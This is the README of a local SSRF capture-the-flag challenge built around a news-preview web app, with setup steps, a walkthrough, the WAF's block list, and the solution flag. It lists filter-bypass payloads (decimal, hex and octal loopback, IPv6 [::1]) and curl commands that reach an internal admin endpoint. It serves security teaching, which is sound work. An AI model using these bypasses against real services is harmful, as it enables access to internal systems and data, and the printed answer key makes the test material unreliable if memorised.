# NewsPreview Platform - SSRF CTF Challenge

A medium-hard level CTF challenge featuring Server-Side Request Forgery (SSRF) vulnerability in a news preview platform.

## 🎯 Challenge Description

NewsPreview is a platform that allows users to paste news article URLs and get instant previews with metadata extraction. The platform fetches external content to extract titles, descriptions, and images from web pages.

**Objective**: Find and exploit the SSRF vulnerability to retrieve the flag from an internal service.

## 🚀 Setup Instructions

### Prerequisites
- Docker and Docker Compose installed
- Basic knowledge of web security and SSRF attacks

### Running the Challenge

1. Clone or download the challenge files
2. Navigate to the challenge directory
3. Build and start the services:

```bash
docker-compose up --build
```

4. Access the application at `http://localhost:3000`

### Services
- **Main Application**: `http://localhost:3000` (publicly accessible)
- **Internal Service**: `http://127.0.0.1:5001` (internal only)

## 🕵️ Challenge Walkthrough

### Initial Reconnaissance

1. **Explore the website**: Visit `http://localhost:3000`
2. **Check robots.txt**: Look at `/robots.txt` for hints
3. **Inspect the source**: Look for HTML comments and hints
4. **Test functionality**: Try the preview feature with legitimate URLs

### Discovery Phase

1. **Network Analysis**: Use browser dev tools or Burp Suite to intercept requests
2. **API Endpoint**: Notice the `/preview?link=` endpoint being called
3. **Parameter Testing**: Test various URL inputs to understand filtering

### Exploitation Path

1. **Basic SSRF Attempt**: Try `http://127.0.0.1:5001/admin/flag`
   - Result: Blocked by WAF with "Access denied: loopback protection."

2. **WAF Bypass Techniques**:
   - **Decimal IP Encoding**: `http://2130706433:5001/admin/flag`
   - **IPv6 Loopback**: `http://[::1]:5001/admin/flag`
   - **Redirect-based bypass**: Set up external redirect to internal service

3. **Flag Retrieval**: Successfully bypass WAF to access internal flag endpoint

## 🛡️ WAF Rules (What's Blocked)

The challenge includes a Web Application Firewall that blocks:
- `localhost` (case-insensitive)
- `127.0.0.1`
- `file://` protocol
- `169.254.` (link-local addresses)
- URLs starting with `127.`
- URLs starting with `0.0.0.0`
- Non-HTTP/HTTPS protocols

## 🎯 Bypass Techniques

### Method 1: Decimal IP Conversion
Convert `127.0.0.1` to decimal format:
- `127.0.0.1` = `2130706433`
- URL: `http://2130706433:5001/admin/flag`

### Method 2: IPv6 Loopback
Use IPv6 loopback address:
- URL: `http://[::1]:5001/admin/flag`

### Method 3: Alternative Loopback Representations
- `http://0x7f000001:5001/admin/flag` (hexadecimal)
- `http://017700000001:5001/admin/flag` (octal)

## 🏆 Solution

The flag can be obtained by making a request to:
```
http://localhost:3000/preview?link=http://2130706433:5001/admin/flag
```

Or:
```
http://localhost:3000/preview?link=http://[::1]:5001/admin/flag
```

**Flag**: `ACNCTF{ssrf_balanced_challenge}`

## 🔍 Hints in the Challenge

1. **HTML Comment**: `<!-- powered by internal news-parser 1.0 -->`
2. **robots.txt**: Contains reference to `/internal-admin` being restricted
3. **WAF Error Messages**: Provide clues about what's being filtered
4. **Internal Service Discovery**: Try common internal ports and paths

## 🧠 Learning Objectives

- Understanding SSRF vulnerabilities and their impact
- WAF bypass techniques for SSRF
- IP address encoding methods
- Internal service discovery
- Difference between blacklist and whitelist filtering

## 🛠️ Development Notes

### Architecture
- **Main App** (Port 3000): Express.js application with the vulnerable `/preview` endpoint
- **Internal Service** (Port 5001): Simulated internal service hosting the flag
- **Docker Network**: Isolated environment preventing direct external access to internal service

### Security Features
- Basic WAF implementation with common SSRF protections
- Request logging for debugging
- Timeout and redirect limits to prevent DoS

## 🔧 Debugging

### Check Service Status
```bash
# View logs
docker-compose logs main-app
docker-compose logs internal-service

# Test internal service (from inside container)
docker-compose exec main-app wget -qO- http://internal-service:5001/admin/flag
```

### Manual Testing
```bash
# Test main app
curl "http://localhost:3000/preview?link=https://example.com"

# Test blocked request
curl "http://localhost:3000/preview?link=http://127.0.0.1:5001/admin/flag"

# Test bypass
curl "http://localhost:3000/preview?link=http://2130706433:5001/admin/flag"
```

## 📚 Additional Resources

- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- [PortSwigger SSRF Lab](https://portswigger.net/web-security/ssrf)
- [IP Address Converters](https://www.silisoftware.com/tools/ipconverter.php)

## ⚠️ Disclaimer

This challenge is designed for educational purposes and authorized testing environments only. Do not use these techniques against systems you do not own or have explicit permission to test.
